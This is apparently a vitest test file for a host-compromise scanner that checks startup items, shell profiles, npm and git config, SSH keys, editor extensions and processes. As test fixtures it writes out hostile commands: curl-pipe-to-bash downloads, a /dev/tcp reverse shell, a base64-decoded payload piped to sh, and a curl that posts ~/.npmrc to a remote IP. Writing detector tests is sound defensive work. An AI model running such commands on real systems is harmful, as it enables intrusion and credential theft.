import { mkdirSync, utimesSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { scanHost } from "../src/scan/host.js";
import {
  configFindings,
  credentialInventory,
  processFindings,
  recentExtensions,
  riskSignals,
  shellStartupFindings,
  signerOf,
  startupCommand,
} from "../src/scan/hostintel.js";
import { walk } from "../src/scan/walk.js";
import { AIKIDO_IOCS, tmp } from "./helpers.js";

const NOW = new Date("2026-11-12T12:00:00Z");
const RECENT = Date.parse("2026-11-01T00:00:00Z");
const none = async () => ({ ok: false, status: 1, stdout: "", stderr: "", missing: true });

function put(root: string, rel: string, body: string, mtime?: Date) {
  const p = join(root, rel);
  mkdirSync(join(p, ".."), { recursive: true });
  writeFileSync(p, body);
  if (mtime) utimesSync(p, mtime, mtime);
  return p;
}

describe("risk signals", () => {
  const home = "/Users/u";
  it("names fetch-and-run, reverse shells, encoded payloads and odd locations", () => {
    expect(riskSignals("/bin/sh -c curl -fsSL https://x.sh | bash", undefined, home)).toEqual(["downloads and runs a script"]);
    expect(riskSignals("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", undefined, home)).toContain("opens a raw network socket (reverse shell pattern)");
    expect(riskSignals("echo aGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8= | base64 -d | sh", undefined, home)).toContain(
      "decodes and runs an encoded payload",
    );
    expect(riskSignals("", "/private/tmp/.x/agent", home)[0]).toMatch(/temporary or shared folder/);
    expect(riskSignals("", "/Users/u/.cache-sys/upd", home)[0]).toMatch(/hidden folder/);
    expect(riskSignals("", "/Users/u/.nvm/versions/node/v20/bin/node", home)).toEqual([]);
    expect(riskSignals("/Applications/RustDesk.app/Contents/MacOS/RustDesk --server", "/Applications/RustDesk.app/Contents/MacOS/RustDesk", home)).toEqual([]);
  });

  it("reads what a launchd, systemd or autostart item runs", () => {
    const plist = "<key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string><string>/opt/x/run --flag &amp;&amp; echo</string></array>";
    expect(startupCommand(plist)).toEqual({ command: "/bin/sh -c /opt/x/run --flag && echo", executable: "/opt/x/run" });
    expect(startupCommand("[Service]\nExecStart=-/usr/bin/agent --x\n")).toEqual({ command: "/usr/bin/agent --x", executable: "/usr/bin/agent" });
    expect(startupCommand("<key>Program</key><string>/usr/local/bin/a</string>").executable).toBe("/usr/local/bin/a");
  });

  it("reads the signer from codesign", async () => {
    const signed = async () => ({
      ok: true,
      status: 0,
      stdout: "",
      stderr: "Authority=Developer ID Application: ACME (ABCDE12345)\nTeamIdentifier=ABCDE12345\n",
    });
    expect(await signerOf(signed, "/x")).toEqual({ signed: true, signer: "Developer ID Application: ACME (ABCDE12345)", team: "ABCDE12345" });
    const unsigned = async () => ({ ok: false, status: 1, stdout: "", stderr: "/x: code object is not signed at all\n" });
    expect(await signerOf(unsigned, "/x")).toEqual({ signed: false });
    expect(await signerOf(none, "/x")).toBeUndefined();
  });
});

describe("machine checks without IOCs", () => {
  it("flags risky lines in shell startup files, not ordinary tool setup", () => {
    const home = tmp("ug-rc-");
    put(home, ".zshrc", 'eval "$(brew shellenv)"\n# curl x | sh in a comment\nexport NODE_OPTIONS="--require /Users/x/.h/hook.js"\nalias sudo="/tmp/s"\n');
    put(home, ".profile", "curl -s https://evil.example/i.sh | bash\n");
    const r = shellStartupFindings(home);
    expect(r.findings.map((f) => f.title)).toEqual([
      ".zshrc line 3 makes every Node.js process load a module",
      ".zshrc line 4 redefines a security-sensitive command",
      ".profile line 1 downloads and runs a script",
    ]);
  });

  it("flags a foreign npm registry, global git hooks and fresh authorized_keys", () => {
    const home = tmp("ug-cfg-");
    put(home, ".npmrc", "registry=https://npm.evil.example/\n//registry.npmjs.org/:_authToken=secret\n");
    put(home, ".gitconfig", "[core]\n\thooksPath = ~/.githooks\n");
    put(home, ".githooks/pre-commit", "#!/bin/sh\n");
    put(home, ".ssh/authorized_keys", "ssh-ed25519 AAAA attacker@box\n");
    const t = configFindings(home, RECENT).map((f) => f.title);
    expect(t[0]).toBe("~/.npmrc sends every npm install to another registry: https://npm.evil.example/");
    expect(t[1]).toMatch(/global hooks from ~\/\.githooks.*changed recently: pre-commit/);
    expect(t[2]).toMatch(/authorized_keys changed recently: 1 key\(s\).*attacker@box/);
    expect(configFindings(tmp(), RECENT)).toEqual([]);
  });

  it("tells a new extension from an update, and a .vsix from the Marketplace", () => {
    const home = tmp("ug-ext-");
    const ts = Date.parse("2026-11-10T00:00:00Z");
    put(
      home,
      ".vscode/extensions/extensions.json",
      JSON.stringify([
        {
          identifier: { id: "good.updated" },
          version: "2.0.0",
          location: { path: "/e/a" },
          metadata: { installedTimestamp: ts, updated: true, source: "gallery" },
        },
        {
          identifier: { id: "new.one" },
          version: "1.0.0",
          location: { path: "/e/b" },
          metadata: { installedTimestamp: ts, source: "vsix", publisherDisplayName: "Unknown Dev" },
        },
        {
          identifier: { id: "old.one" },
          version: "1.0.0",
          location: { path: "/e/c" },
          metadata: { installedTimestamp: Date.parse("2026-01-01"), source: "gallery" },
        },
      ]),
    );
    const r = recentExtensions(home, RECENT);
    expect(r.findings.map((f) => f.title)).toEqual([
      "Editor extension new.one@1.0.0 was newly installed in vscode (publisher: Unknown Dev), from a .vsix file, not the Marketplace: check it is the one you meant",
    ]);
  });

  it("flags processes running from temporary or unknown hidden folders", async () => {
    const ps = async () => ({
      ok: true,
      status: 0,
      stdout: "  10 /usr/bin/ssh\n  11 /private/tmp/.x/miner\n  12 /Users/u/.nvm/node\n  13 /Users/u/.sys/upd\n",
      stderr: "",
    });
    expect((await processFindings(ps, "/Users/u")).map((f) => f.subject)).toEqual(["/private/tmp/.x/miner", "/Users/u/.sys/upd"]);
  });

  it("inventories credential stores by path, without reading values", () => {
    const home = tmp("ug-cred-");
    put(home, ".aws/credentials", "[default]\n");
    put(home, ".npmrc", "registry=https://registry.npmjs.org/\n");
    put(home, ".ssh/id_ed25519", "k");
    put(home, ".ssh/id_ed25519.pub", "k");
    const kinds = credentialInventory(home, ["/p/.env"]).map((c) => c.kind);
    expect(kinds).toEqual(["AWS access keys", "SSH private key", ".env file (project secrets)"]); // .npmrc without a token is not a credential
  });
});

describe("host scan integration", () => {
  it("an old startup item that fetches and runs code is suspicious; an IOC in .zshrc is a compromise", async () => {
    const home = tmp("ug-int-");
    const la = join(home, "LA");
    put(
      home,
      "LA/com.update.plist",
      "<key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string><string>curl -s http://x/i | sh</string></array>",
      new Date("2025-01-01"),
    );
    put(
      home,
      "LA/com.apple.updater.plist",
      "<key>Label</key><string>com.apple.updater</string><key>Program</key><string>/usr/local/bin/u</string>",
      new Date("2025-01-01"),
    );
    put(home, "LA/com.fine.plist", "<key>Program</key><string>/usr/bin/true</string>", new Date("2025-01-01"));
    put(home, ".zshrc", "export X=1\ncurl http://194.150.166.244:8080/exfil -d @~/.npmrc\n");
    const r = await scanHost(AIKIDO_IOCS, walk([join(home, "nothing")]), none, { home, startupDirs: [la], skipLive: true, now: NOW });
    const t = r.findings.map((f) => `${f.severity}: ${f.title}`);
    expect(t.some((x) => x.startsWith("suspicious: Risky startup item com.update.plist") && x.includes("downloads and runs a script"))).toBe(true);
    expect(t.some((x) => x.includes("com.fine.plist"))).toBe(false);
    expect(t.some((x) => x.startsWith("compromised:") && x.includes(".zshrc line 2"))).toBe(true);
    expect(t.some((x) => x.includes("com.apple.updater.plist") && x.includes("named like an Apple service"))).toBe(true);
    expect(r.inventory.startupItems).toHaveLength(3);
  });

  it("an exact file name whose campaign publishes hashes needs the hash; a wildcard dropper name does not", async () => {
    const home = tmp("ug-exact-");
    put(home, "cache/pkg/Math_Symbol.js", "ordinary table");
    put(home, "proj/.ci-ab12cd.sh", "dropper");
    const iocs = {
      campaigns: [
        {
          ...(AIKIDO_IOCS.campaigns[0] as (typeof AIKIDO_IOCS.campaigns)[0]),
          indicators: [
            { type: "file" as const, value: "Math_Symbol.js", source: "S1" },
            { type: "file" as const, value: ".ci-*.sh", source: "S1" },
            { type: "sha256" as const, value: "b".repeat(64), source: "S1" },
          ],
        },
      ],
    };
    const r = await scanHost(iocs, walk([home]), none, { home, startupDirs: [], skipLive: true, now: NOW });
    const sev = Object.fromEntries(r.findings.filter((f) => f.subject.includes("/")).map((f) => [f.subject.split("/").pop(), f.severity]));
    expect(sev).toEqual({ "Math_Symbol.js": "suspicious", ".ci-ab12cd.sh": "compromised" });
  });
});
